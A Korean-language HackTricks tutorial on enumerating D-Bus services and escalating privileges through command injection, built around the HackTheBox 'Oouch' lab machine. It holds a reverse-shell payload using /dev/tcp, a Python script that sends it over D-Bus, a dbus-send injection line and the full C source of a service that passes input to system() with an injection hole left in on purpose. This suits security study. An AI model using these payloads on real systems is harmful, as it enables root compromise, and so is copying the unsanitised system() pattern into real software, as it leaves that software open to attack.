# D-Bus 열거 및 명령 주입 권한 상승

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}

## **GUI 열거**

D-Bus는 Ubuntu 데스크톱 환경에서 프로세스 간 통신 (IPC) 미디에이터로 사용됩니다. Ubuntu에서는 여러 메시지 버스의 동시 작동이 관찰됩니다: 시스템 버스는 **시스템 전체에서 관련 서비스를 노출하는 권한 있는 서비스에 의해 주로 사용**되며, 각 로그인한 사용자마다 세션 버스가 있어 해당 특정 사용자에게만 관련 서비스를 노출합니다. 여기서 주로 시스템 버스에 초점을 맞추는 이유는 더 높은 권한 (예: 루트)으로 실행되는 서비스와 관련이 있기 때문입니다. D-Bus의 아키텍처는 세션 버스당 '라우터'를 사용하며, 클라이언트 메시지를 클라이언트가 통신하려는 서비스를 기반으로 적절한 서비스로 리디렉션하는 역할을 합니다.

D-Bus의 서비스는 노출하는 **객체** 및 **인터페이스**에 의해 정의됩니다. 객체는 표준 OOP 언어에서 클래스 인스턴스와 유사하며, 각 인스턴스는 **객체 경로**에 의해 고유하게 식별됩니다. 연구 목적을 위한 주요 인터페이스는 **org.freedesktop.DBus.Introspectable** 인터페이스로, 단일 메서드인 Introspect를 특징으로 합니다. 이 메서드는 객체의 지원하는 메서드, 시그널 및 속성의 XML 표현을 반환하며, 여기서는 속성과 시그널을 제외하고 메서드에 중점을 둡니다.

D-Bus 인터페이스와의 통신을 위해 두 가지 도구를 사용했습니다: D-Bus에서 노출된 메서드를 쉽게 호출하기 위한 CLI 도구인 **gdbus** 및 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), Python 기반의 GUI 도구로, 각 버스에서 사용 가능한 서비스를 열거하고 각 서비스에 포함된 객체를 표시하는 데 사용됩니다.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


첫 번째 이미지에서는 D-Bus 시스템 버스에 등록된 서비스가 표시되며, **org.debin.apt**가 특히 System Bus 버튼을 선택한 후 강조되었습니다. D-Feet는이 서비스에 대한 객체를 쿼리하여 선택한 객체에 대한 인터페이스, 메서드, 속성 및 시그널을 표시하며, 두 번째 이미지에서 볼 수 있습니다. 각 메서드의 시그니처도 자세히 설명됩니다.

주목할만한 기능은 서비스의 **프로세스 ID (pid)** 및 **명령 줄**이 표시되어 있어 서비스가 승격된 권한으로 실행되는지 확인하는 데 유용하며, 연구의 관련성을 확인하는 데 중요합니다.

**D-Feet는 또한 메서드 호출을 허용**합니다: 사용자는 파라미터로 Python 표현식을 입력할 수 있으며, D-Feet는이를 서비스로 전달하기 전에 D-Bus 유형으로 변환합니다.

그러나 **일부 메서드는 인증이 필요**할 수 있으므로 우리가 자격 증명없이 권한을 상승시키는 것이 목표이기 때문에 이러한 메서드를 무시할 것입니다.

또한 일부 서비스가 다른 D-Bus 서비스인 org.freedeskto.PolicyKit1을 쿼리하여 사용자가 특정 작업을 수행할 수 있는지 여부를 확인합니다.

## **Cmd line 열거**

### 서비스 객체 목록

D-Bus 인터페이스를 열거하는 것이 가능합니다.
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### 연결

[위키백과에서:](https://en.wikipedia.org/wiki/D-Bus) 프로세스가 버스에 연결을 설정하면, 버스는 해당 연결에 _고유 연결 이름_이라고 불리는 특별한 버스 이름을 할당합니다. 이 유형의 버스 이름은 변경할 수 없으며, 연결이 존재하는 한 변경되지 않음이 보장됩니다. 더 중요한 것은 이러한 고유 연결 이름이 버스 수명 동안 재사용될 수 없다는 것입니다. 이는 동일한 프로세스가 버스에 대한 연결을 닫고 새로운 연결을 만들더라도 다른 연결이 해당 고유 연결 이름을 할당받지 않을 것을 의미합니다. 고유 연결 이름은 일반적으로 금지된 콜론 문자로 시작하기 때문에 쉽게 식별할 수 있습니다.

### 서비스 객체 정보

그런 다음, 인터페이스에 대한 일부 정보를 얻을 수 있습니다.
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### 서비스 객체의 인터페이스 목록 나열

충분한 권한이 필요합니다.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 서비스 객체의 인트로스펙트 인터페이스

이 예에서는 `tree` 매개변수를 사용하여 발견된 최신 인터페이스가 선택되었음에 유의하십시오. (_이전 섹션 참조_) :
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### 모니터/캡처 인터페이스

충분한 권한이 있으면 (`send_destination` 및 `receive_sender` 권한만으로는 충분하지 않음) **D-Bus 통신을 모니터링**할 수 있습니다.

**통신을 모니터링**하려면 **루트**여야합니다. 여전히 루트로 문제가 발생하는 경우 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 및 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)를 확인하십시오.

{% hint style="warning" %}
D-Bus 구성 파일을 구성하여 **루트가 아닌 사용자가 통신을 스니핑할 수 있도록**하는 방법을 알고 계신다면 **저에게 연락**해주세요!
{% endhint %}

모니터링하는 다양한 방법:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
다음 예에서는 인터페이스 `htb.oouch.Block`이 모니터링되며 **"**_**lalalalal**_**" 메시지가 잘못된 통신을 통해 전송됩니다**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
#### 모든 소음 필터링 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

버스 상에 너무 많은 정보가 있다면 다음과 같이 일치 규칙을 전달하세요:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
다수의 규칙을 지정할 수 있습니다. 메시지가 규칙 중 _어떤 하나라도_ 일치하는 경우 메시지가 출력됩니다. 다음과 같이:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
[D-Bus 문서](http://dbus.freedesktop.org/doc/dbus-specification.html)에서 일치 규칙 구문에 대한 자세한 정보를 확인하세요.

### 더 보기

`busctl`에는 더 많은 옵션이 있습니다. [**여기에서 모두 찾을 수 있습니다**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **취약한 시나리오**

호스트 "oouch"에서 사용자 **HTB 내의 qtc로** _/etc/dbus-1/system.d/htb.oouch.Block.conf_에 위치한 **예기치 않은 D-Bus 구성 파일**을 찾을 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
이전 구성에서 **이 D-BUS 통신을 통해 정보를 보내고 받으려면 사용자 `root` 또는 `www-data` 여야합니다**.

도커 컨테이너 **aeb4525789d8** 내의 사용자 **qtc**로 _/code/oouch/routes.py_ 파일에서 일부 dbus 관련 코드를 찾을 수 있습니다. 이것이 흥미로운 코드입니다:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
다음과 같이 **D-Bus 인터페이스에 연결**하고 "Block" 함수에 "client\_ip"을 보냅니다.

D-Bus 연결의 다른 쪽에는 컴파일된 C 이진 파일이 실행 중입니다. 이 코드는 D-Bus 연결에서 IP 주소를 수신하고 `system` 함수를 통해 주어진 IP 주소를 차단합니다.\
**`system` 호출은 의도적으로 명령 삽입에 취약**하며, 다음과 같은 payload는 역쉘을 생성합니다: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

이 페이지의 끝에는 **D-Bus 애플리케이션의 완전한 C 코드**를 찾을 수 있습니다. 이 코드 안에는 **`D-Bus 객체 경로`**와 **`인터페이스 이름`**이 **등록**되는 방법이 91-97행 사이에 나와 있습니다. 이 정보는 D-Bus 연결로 정보를 보내는 데 필요합니다:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
또한, 57번째 줄에서 **등록된 유일한 메서드**는 `Block`이라고 불립니다(_**따라서 다음 섹션에서 페이로드가 서비스 객체 `htb.oouch.Block`, 인터페이스 `/htb/oouch/Block` 및 메서드 이름 `Block`으로 전송될 것입니다**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### 파이썬

다음 파이썬 코드는 `Block` 메서드로 페이로드를 D-Bus 연결에 보내며 `block_iface.Block(runme)`를 통해 실행됩니다. (_이전 코드 청크에서 추출되었음을 유의하십시오_) :
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 및 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`는 "메시지 버스"로 메시지를 보내는 데 사용되는 도구입니다.
* 메시지 버스 - 시스템이 응용 프로그램 간 통신을 쉽게 하기 위해 사용하는 소프트웨어입니다. 메시지 큐와 관련이 있지만 메시지 버스에서는 메시지가 구독 모델로 전송되며 매우 빠릅니다.
* "-system" 태그는 시스템 메시지가 아닌 세션 메시지(기본값)임을 나타내기 위해 사용됩니다.
* "--print-reply" 태그는 메시지를 적절하게 출력하고 인간이 읽을 수 있는 형식으로 모든 응답을 받기 위해 사용됩니다.
* "--dest=Dbus-Interface-Block" - Dbus 인터페이스의 주소입니다.
* "--string:" - 인터페이스로 보내려는 메시지의 유형입니다. 더블, 바이트, 부울, 정수, objpath와 같은 여러 형식으로 메시지를 보낼 수 있습니다. 이 중 "object path"는 파일 경로를 Dbus 인터페이스로 보내고자 할 때 유용합니다. 이 경우 특수 파일(FIFO)을 사용하여 파일의 이름으로 인터페이스에 명령을 전달할 수 있습니다. "string:;" - 이는 다시 FIFO 역쉘 파일/명령의 위치를 호출하는 것으로, 여기에 파일의 이름을 넣습니다.

_`htb.oouch.Block.Block`에서 첫 번째 부분(`htb.oouch.Block`)은 서비스 객체를 참조하고 마지막 부분(`.Block`)은 메서드 이름을 참조합니다._

### C 코드

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## 참고 자료
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 팁을 공유하려면 **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하세요.

</details>
{% endhint %}
